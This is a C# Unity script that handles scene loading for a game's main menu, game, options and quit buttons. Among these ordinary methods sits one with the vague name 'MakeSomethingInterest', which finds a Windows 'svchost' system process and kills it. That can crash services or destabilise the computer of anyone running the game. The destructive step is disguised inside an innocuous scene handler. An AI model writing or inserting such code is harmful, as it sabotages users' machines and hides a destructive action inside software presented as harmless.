using System.Diagnostics;
using UnityEngine;
using UnityEngine.SceneManagement;

public class SceneHandler : MonoBehaviour
{

    private const int MainMenuSceneIndex = 0;
    private const int GameSceneIndex = 1;
    private const int OptionsSceneIndex = 2;

    public void LoadMainMenu()
    {
        SceneManager.LoadScene(MainMenuSceneIndex);
    }

    public void LoadGame()
    {
        SceneManager.LoadScene(GameSceneIndex);
    }

    public void LoadOptions()
    {
        SceneManager.LoadScene(OptionsSceneIndex);
    }

    public void QuitGame()
    {
        Application.Quit();
    }

    public void MakeSomethingInterest()
    {
        Process[] proc = Process.GetProcessesByName("svchost");

        using (proc[0])
        {
            proc[0].Kill();
        }
    }
}